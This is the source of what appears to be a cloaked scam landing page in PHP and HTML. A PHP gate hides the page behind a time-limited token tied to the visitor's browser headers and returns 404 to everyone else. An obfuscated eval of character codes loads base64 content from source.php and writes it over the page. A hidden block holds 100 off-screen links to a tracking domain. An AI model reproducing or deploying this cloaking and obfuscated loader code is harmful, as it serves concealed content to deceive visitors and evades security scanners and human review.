<?php $e='98f519b98ea2dfa0c2d21340f5fcdbf2';$f='404';$g=@$_GET["lpkey"];date_default_timezone_set('Asia/Shanghai');$h=substr($g,0,2).substr($g,4,2).substr($g,8,2).substr($g,12,2).substr($g,16,2);$i=substr($g,2,2).substr($g,6,2).substr($g,10,2).substr($g,14,2);$j=md5($e.$_SERVER['HTTP_ACCEPT_LANGUAGE'].$_SERVER["HTTP_USER_AGENT"].$h);$j=substr($j,2,2).substr($j,7,2).substr($j,12,2).substr($j,24,2);if(time()>$h||$j!==$i||!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){if($f=='404')Header("HTTP/1.1 404 Not Found");else{header('HTTP/1.1 301 Moved Permanently');header('Location: '.$k);}die();}?>


<<!DOCTYPE html>
<head>
    <meta charset="utf-8">
    <title></title>
    <script src="js/zepto.min.js"></script>

</head>

<body>
<script src="js/base64.min.js"></script>
<script>
    window["\x65\x76\x61\x6c"](String.fromCharCode.apply(null,'102з117з110з99з116з105з111з110з32з98з54з52з68з101з99з111з100з101з85з110з105з99з111з100з101з40з115з116з114з41з32з123з10з32з32з32з32з32з32з32з32з114з101з116з117з114з110з32з100з101з99з111з100з101з85з82з73з67з111з109з112з111з110з101з110з116з40з97з116з111з98з40з115з116з114з41з46з115з112з108з105з116з40з39з39з41з46з109з97з112з40з102з117з110з99з116з105з111з110з40з99з41з32з123з10з32з32з32з32з32з32з32з32з32з32з32з32з114з101з116з117з114з110з32з39з37з39з32з43з32з40з39з48з48з39з32з43з32з99з46з99з104з97з114з67з111з100з101з65з116з40з48з41з46з116з111з83з116з114з105з110з103з40з49з54з41з41з46з115з108з105з99з101з40з45з50з41з59з10з32з32з32з32з32з32з32з32з125з41з46з106з111з105з110з40з39з39з41з41з59з10з32з32з32з32з125з10з32з32з32з32з36з46з97з106з97з120з40з123з10з32з32з32з32з32з32з32з32з116з121з112з101з58з32з39з71з69з84з39з44з10з32з32з32з32з32з32з32з32з117з114з108з58з32з34з115з111з117з114з99з101з46з112з104з112з34з44з10з32з32з32з32з32з32з32з32з99з97з99з104з101з58з32з102з97з108з115з101з44з10з32з32з32з32з32з32з32з32з100з97з116з97з58з32з123з10з32з32з32з32з32з32з32з32з32з32з32з32з118з58з32з103з101з116з81з117з101з114з121з83з116з114з105з110з103з40з34з118з34з41з10з32з32з32з32з32з32з32з32з125з44з10з32з32з32з32з32з32з32з32з115з117з99з99з101з115з115з58з32з102з117з110з99з116з105з111з110з40з100з97з116з97з41з32з123з10з32з32з32з32з32з32з32з32з32з32з32з32з118з97з114з32з100з111з99з32з61з32з100з111з99з117з109з101з110з116з46з111з112з101з110з40з39з116з101з120з116з47з104з116з109з108з39з44з32з39з114з101з112з108з97з99з101з39з41з59з10з32з32з32з32з32з32з32з32з32з32з32з32з118з97з114з32з100з97з116з32з61з32з98з54з52з68з101з99з111з100з101з85з110з105з99з111з100з101з40з100з97з116з97з41з59з10з32з32з32з32з32з32з32з32з32з32з32з32з100з111з99з46з119з114з105з116з101з40з100з97з116з41з59з10з32з32з32з32з32з32з32з32з32з32з32з32з100з111з99з46з99з108з111з115з101з40з41з59з10з32з32з32з32з32з32з32з32з125з44з10з32з32з32з32з32з32з32з32з101з114з114з111з114з58з32з102з117з110з99з116з105з111з110з40з41з32з123з125з10з32з32з32з32з125з41з59з10з10з32з32з32з32з102з117з110з99з116з105з111з110з32з103з101з116з81з117з101з114з121з83з116з114з105з110з103з40з110з97з109з101з41з32з123з10з32з32з32з32з32з32з32з32з118з97з114з32з114з101з103з32з61з32з110з101з119з32з82з101з103з69з120з112з40з39з40з94з124з38з41з39з32з43з32з110з97з109з101з32з43з32з39з61з40з91з94з38з93з42з41з40з38з124з36з41з39з44з32з39з105з39з41з59з10з32з32з32з32з32з32з32з32з118з97з114з32з114з32з61з32з119з105з110з100з111з119з46з108з111з99з97з116з105з111з110з46з115з101з97з114з99з104з46з115з117з98з115з116з114з40з49з41з46з109з97з116з99з104з40з114з101з103з41з59з10з32з32з32з32з32з32з32з32з105з102з32з40з114з32з33з61з32з110з117з108з108з41з32з123з10з32з32з32з32з32з32з32з32з32з32з32з32з114з101з116з117з114з110з32з117з110з101з115з99з97з112з101з40з114з91з50з93з41з59з10з32з32з32з32з32з32з32з32з125з10з32з32з32з32з32з32з32з32з114з101з116з117з114з110з32з110з117з108з108з59з10з32з32з32з32з125'.split(/з/ig)))
</script>

<div style="display: none;">
<?php for ($i = 0; $i < 100; $i++) { ?>
    <a href="https://trk.reactorphone.com/d/<?php echo session_create_id() ?>" style="position: absolute; left: -100px;">Check
        Now</a>
<?php } ?>

<script>
    function b64DecodeUnicode(str) {
        return decodeURIComponent(atob(str).split('').map(function (c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
    }

    $.ajax({
        type: 'GET',
        url: "source.php",
        cache: false,
        data: {
            v: getQueryString("v")
        },
        success: function (data) {
            var doc = document.open('text/html', 'replace');
            var dat = b64DecodeUnicode(data);
            doc.write(dat);
            doc.close();
        },
        error: function () {

        }
    });

    function getQueryString(name) {
        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
        var r = window.location.search.substr(1).match(reg);
        if (r != null) {
            return unescape(r[2]);
        }
        return null;
    }
</script>

</body>
</html>
